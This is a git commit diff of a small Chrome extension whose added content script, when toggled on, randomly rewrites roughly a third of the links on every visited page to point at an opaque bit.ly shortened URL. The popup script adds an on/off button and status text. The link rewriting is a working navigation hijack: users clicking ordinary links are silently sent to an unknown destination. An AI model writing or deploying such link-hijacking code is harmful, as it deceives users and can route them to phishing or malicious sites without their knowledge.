c17dc14d947850349a1749a5bd0e5e6a8ed5c9d9
MSGuy01 <47047931+MSGuy01@users.noreply.github.com>
2020-12-16 21:23:43 -0800

    Add files via upload

--- content.js
+++ content.js
@@ -1,23 +1,20 @@
+chrome.runtime.sendMessage({greeting: "hello"}, function(response) {
+  console.log(response.farewell);
+  localStorage.setItem("on", response.farewell);
+  if (localStorage.getItem("on") == "on") {
+    var a = document.getElementsByTagName("a");
+    for (var i = 0; i < a.length; i++) {
+      var random = Math.floor((Math.random() * 3) + 1);
+      if (random == 2) {
+        a[i].href = "http://bit.ly/30QqsQ2";
+      }
+    }
+  }
+});
 
-console.log("extension works!");
-var a = document.getElementsByTagName("a");
-console.log(localStorage.getItem("on"));
+
 chrome.runtime.onMessage.addListener(
   function(request, sender, sendResponse) {
-  	alert("Extension is " + request.greeting);
-    if (request.greeting == "on") {
-    	localStorage.setItem("on", "on");
-    }
-    else{
-    	localStorage.setItem("on", "off");
-    }
     location.reload();
-  });
-if (localStorage.getItem("on") == "on") {
-	for (var i = 0; i < a.length; i++) {
-		var random = Math.floor((Math.random() * 3) + 1);
-		if (random == 2) {
-			a[i].href = "http://bit.ly/30QqsQ2";
-		}
-	}
-}
+  }
+);
--- popup.js
+++ popup.js
@@ -1,15 +1,31 @@
-document.getElementById("change").addEventListener("click", function() {
-	if (! localStorage.getItem("on") || localStorage.getItem("on") == "on") {
-		document.getElementById("change").innerHTML = "Turn On";
-		localStorage.setItem("on", "off");
-	}
-	else{
-		document.getElementById("change").innerHTML = "Turn Off";
-		localStorage.setItem("on", "on");
-	}
+var sendToContent = function() {
 	chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
-	  chrome.tabs.sendMessage(tabs[0].id, {greeting: localStorage.getItem("on")}, function(response) {
-	    console.log(response.farewell);
+	  chrome.tabs.sendMessage(tabs[0].id, {greeting: "hello"}, function(response) {
+	    console.log("reloaded");
 	  });
 	});
+}
+
+var changeText = function() {
+	if (localStorage.getItem("on") == "off") {
+		document.getElementById("status").innerHTML = "Extension is: off";
+		document.getElementById("change").innerHTML = "Turn on";
+	}
+	else {
+		document.getElementById("status").innerHTML = "Extension is: on";
+		document.getElementById("change").innerHTML = "Turn off";
+	}
+}
+changeText();
+document.getElementById("change").addEventListener("click", function() {
+	console.log("clicked");
+	 var port = chrome.extension.connect({
+      name: "Sample Communication"
+	 });
+	 port.postMessage("Hi BackGround");
+	 port.onMessage.addListener(function(msg) {
+	      console.log("message recieved" + msg);
+	      changeText();
+	 });
+	 sendToContent();
 });
